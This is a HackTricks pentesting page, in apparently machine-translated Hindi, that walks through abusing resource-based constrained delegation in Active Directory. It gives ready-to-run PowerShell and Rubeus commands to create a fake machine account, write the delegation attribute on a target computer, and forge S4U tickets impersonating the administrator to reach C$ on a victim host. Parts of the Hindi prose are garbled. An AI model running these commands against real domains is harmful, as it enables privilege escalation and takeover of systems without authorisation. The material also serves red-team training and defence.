# संसाधन-आधारित सीमित अधिकार

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में** देखना चाहते हैं या **HackTricks को PDF में डाउनलोड** करना चाहते हैं तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें और PR जमा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) **और** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos पर।**

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## संकेतित संकेतन की मूल बातें

यह मूल [संकेतित संकेतन](constrained-delegation.md) के बराबर है लेकिन **बजाय** किसी **वस्तु** को **किसी सेवा के खिलाफ किसी उपयोगकर्ता का अनुकरण करने की अनुमति देने के**. संसाधित संकेतन **वस्तु में उस उपयोगकर्ता का नाम रखता है जो उसके खिलाफ किसी भी अन्य उपयोगकर्ता का अनुकरण कर सकता है**.

इस मामले में, संकेतित वस्तु के पास _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ नामक एक विशेषता होगी जिसमें उस उपयोगकर्ता का नाम होगा जो उसके खिलाफ किसी भी अन्य उपयोगकर्ता का अनुकरण कर सकता है।
### नए अवधारणाएँ

Constrained Delegation से एक महत्वपूर्ण अंतर यह है कि किसी भी उपयोगकर्ता के पास **एक मशीन खाते पर लेखन अनुमतियाँ** होने पर (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) वह _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ को सेट कर सकता है (दूसरे प्रकार की Delegation में आपको डोमेन व्यवस्थापक विशेषाधिकार चाहिए थे।)

### हमला संरचना

> यदि आपके पास **किसी कंप्यूटर खाते पर लेखन समकक्ष अनुमतियाँ** हैं तो आप उस मशीन में **विशेषाधिकार** प्राप्त कर सकते हैं।
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## हमला
### Creating a Computer Object

You can create a computer object inside the domain using [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Constrained Delegation** कॉन्फ़िगर करना

**activedirectory PowerShell मॉड्यूल का उपयोग करें**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**पावरव्यू का उपयोग करें**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### एक पूर्ण S4U हमला करना

First of all, we created the new Computer object with the password `123456`, so we need the hash of that password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
यह खाते के लिए RC4 और AES हैश प्रिंट करेगा।\
अब, हमला किया जा सकता है:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
आप एक बार पूछकर अधिक टिकट उत्पन्न कर सकते हैं, Rubeus के `/altservice` पैरामीटर का उपयोग करके:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
ध्यान दें कि उपयोगकर्ताओं के पास "**डेलीगेट नहीं किया जा सकता**" नामक एक गुण होता है। यदि किसी उपयोगकर्ता के पास यह गुण सही है, तो आप उसकी अनुकरण नहीं कर सकेंगे। इस गुण को bloodhound के अंदर देखा जा सकता है।
{% endhint %}

### पहुंचना

आखिरी कमांड लाइन **पूर्ण S4U हमला करेगी और व्यवहार करने वाले होस्ट में से TGS** को व्यवस्थापक से शिकार होस्ट में **मेमोरी** में डाल देगी।\
इस उदाहरण में व्यवस्थापक से **CIFS** सेवा के लिए एक TGS का अनुरोध किया गया था, इसलिए आपको **C$** तक पहुंचने की स्वीकृति होगी:
```bash
ls \\victim.domain.local\C$
```
### विभिन्न सेवा टिकट का दुरुपयोग

[**यहाँ उपलब्ध सेवा टिकट के बारे में जानें**](silver-ticket.md#available-services).

## कर्बेरोस त्रुटियाँ

* **`KDC_ERR_ETYPE_NOTSUPP`**: यह इसका मतलब है कि कर्बेरोस को डीईएस या आरसी 4 का उपयोग नहीं करने के लिए कॉन्फ़िगर किया गया है और आप केवल आरसी 4 हैश प्रदान कर रहे हैं। Rubeus को कम से कम AES256 हैश प्रदान करें (या बस आरसी 4, AES128 और AES256 हैश प्रदान करें)। उदाहरण: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: यह इसका मतलब है कि वर्तमान कंप्यूटर का समय डीसी के समय से अलग है और कर्बेरोस सही ढंग से काम नहीं कर रहा है।
* **`preauth_failed`**: यह इसका मतलब है कि दिए गए उपयोगकर्ता नाम + हैश लॉगिन करने के लिए काम नहीं कर रहे हैं। आपने शायद जब हैश जेनरेट करते समय उपयोगकर्ता नाम में "$" डालना भूल गए हो सकता है (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: इसका मतलब हो सकता है:
  * आप जिसे अनुकरण करने की कोशिश कर रहे हैं, वह वांछित सेवा तक पहुंच नहीं सकता (क्योंकि आप उसे अनुकरण नहीं कर सकते या क्योंकि उसमें पर्याप्त विशेषाधिकार नहीं है)
  * पूछी गई सेवा मौजूद नहीं है (यदि आप विनर्म के लिए टिकट मांगते हैं लेकिन विनर्म नहीं चल रहा है)
  * बनाया गया fakecomputer वंलरेबल सर्वर पर अपनी विशेषाधिकारों को खो चुका है और आपको उन्हें वापस देने की आवश्यकता है।

## संदर्भ

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन HackTricks में देखना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) पर **फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos को PR जमा करके।

</details>
